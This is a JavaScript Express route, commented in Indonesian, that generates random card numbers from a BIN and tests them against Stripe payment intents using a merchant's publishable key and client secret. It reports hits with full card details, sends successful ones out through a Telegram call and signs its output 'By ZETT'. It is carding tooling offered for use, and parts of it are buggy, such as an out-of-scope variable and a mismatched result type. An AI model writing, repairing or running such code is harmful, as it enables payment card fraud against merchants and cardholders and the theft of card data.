const express = require("express");
const router = express.Router();
const axios = require("axios");

// Fungsi untuk menghasilkan kartu kredit secara acak
function generateCreditCard(bin) {
  const randomNum = () => Math.floor(Math.random() * 10);
  const cc = bin + Array.from({ length: 16 - bin.length }, randomNum).join("");
  return cc;
}

// Fungsi utama untuk proses pembayaran
async function pistuff(cc, mes, ano, cvv, pk, pics) {
  // Set headers
  const headers = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    Pragma: "no-cache",
    Accept: "*/*",
  };

  // Start time tracking
  const start_time = Date.now();

  try {
    // Send initial request to get the MUID, SID, and GUID
    const response = await axios.post(
      "https://m.stripe.com/6",
      {},
      { headers }
    );
    const jsonData = response.data;
    const m = jsonData.muid;
    const s = jsonData.sid;
    const g = jsonData.guid;

    // Extract the pi (picture ID) from pics string
    const index = pics.indexOf("_secret_");
    if (index !== -1) {
      var pi = pics.substring(0, index);
    } else {
      return "Secret key not found in response.";
    }

    // Prepare the payment data
    const data = new URLSearchParams();
    data.append("payment_method_data[type]", "card");
    data.append(
      "payment_method_data[billing_details][name]",
      "skibidi+sigma+csub"
    );
    data.append("payment_method_data[card][number]", cc);
    data.append("payment_method_data[card][exp_month]", mes);
    data.append("payment_method_data[card][exp_year]", ano);
    data.append("payment_method_data[guid]", g);
    data.append("payment_method_data[muid]", m);
    data.append("payment_method_data[sid]", s);
    data.append("payment_method_data[pasted_fields]", "number");
    data.append("payment_method_data[referrer]", "https%3A%2F%2Froblox.com");
    data.append("expected_payment_method_type", "card");
    data.append("use_stripe_sdk", "true");
    data.append("key", pk);
    data.append("client_secret", pics);

    // Send second request to confirm payment intent
    const confirmResponse = await axios.post(
      `https://api.stripe.com/v1/payment_intents/${pi}/confirm`,
      data,
      { headers }
    );

    // End time tracking
    const end_time = Date.now();
    const exec_time = end_time - start_time;

    // Check response for errors or success
    if (confirmResponse.data.error && confirmResponse.data.error.code) {
      const error = confirmResponse.data.error;
      const code = error.code;
      const declineCode = error.decline_code;
      const message = error.message;
      return `\x1b[91m➥ 💳 𝐂𝐂 -» ${cc}|${mes}|${ano}|${cvv}\nAmount -» ${
        confirmResponse.data.amount / 100
      } ${confirmResponse.data.currency.toUpperCase()}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» ${code} | ${declineCode} | ${message}\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ ${exec_time.toFixed(
        2
      )} Seconds\x1b[0m\n`;
    }
    // Adding handling for unexpected error
    if (code === "unexpected_error") {
      return `\x1b[91m➥ 💳 𝐂𝐂 -» ${cc}|${mes}|${ano}|${cvv}\nAmount -» ${
        confirmResponse.data.amount / 100
      } ${confirmResponse.data.currency.toUpperCase()}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Unexpected error occurred\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» ${code} | ${declineCode} | ${message}\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ ${exec_time.toFixed(
        2
      )} Seconds\x1b[0m\n`;
    }

    if (
      confirmResponse.data.status === "succeeded" ||
      confirmResponse.data.status === "requires_capture"
    ) {
      const amountSuccess = confirmResponse.data.amount / 100;
      const currencySuccess = confirmResponse.data.currency.toUpperCase();
      sendToTelegram(
        cc,
        mes,
        ano,
        cvv,
        amountSuccess,
        currencySuccess,
        exec_time
      );
      return `\x1b[92m➥ 💳 𝐂𝐂 -» ${cc}|${mes}|${ano}|${cvv}\n➥ Amount -» ${amountSuccess} ${currencySuccess}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ ${exec_time.toFixed(
        2
      )} Seconds\x1b[0m\n`;
    } else if (
      confirmResponse.data.error &&
      (confirmResponse.data.error.code === "requires_source_action" ||
        confirmResponse.data.error.code === "intent_confirmation_challenge" ||
        confirmResponse.data.error.code === "requires_action")
    ) {
      return `\x1b[93m➥ 💳 𝐂𝐂 -» ${cc}|${mes}|${ano}|${cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ ${exec_time.toFixed(
        2
      )} Seconds\x1b[0m\n`;
    } else {
      return `\x1b[91m➥ 💳 𝐂𝐂 -» ${cc}|${mes}|${ano}|${cvv}\nAmount -» ${
        confirmResponse.data.amount / 100
      } ${confirmResponse.data.currency.toUpperCase()}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» Unknown\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ ${exec_time.toFixed(
        2
      )} Seconds\x1b[0m\n`;
    }
  } catch (error) {
    console.error("Error in pistuff function:", error);
    return "An error occurred during the request.";
  }
}

// Route utama
router.post("/generate", async (req, res) => {
  const { bin, pk, pics } = req.body;

  if (!bin || !pk || !pics) {
    return res.json({
      success: false,
      message: "Please provide BIN, PK, and Pics values.",
    });
  }

  try {
    const cc = generateCreditCard(bin);
    const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, "0");
    const ano = Math.floor(Math.random() * (2039 - 2024 + 1)) + 2024;
    const cvv = "000";

    console.log(`TRY CC: ${cc}|${mes}|${ano}|${cvv}`);
    const result = await pistuff(cc, mes, ano, cvv, pk, pics);

    // Assuming result contains fields like message, amount, currency, exec_time
    if (result.success) {
      return res.json({
        success: true,
        message: result.message,
        amount: result.amount,
        currency: result.currency,
        exec_time: result.exec_time,
      });
    } else {
      return res.json({
        success: false,
        message: result.message,
      });
    }
  } catch (error) {
    console.error("Error generating card:", error);
    return res.json({
      success: false,
      message: "An error occurred while processing your request.",
    });
  }
});

module.exports = router;
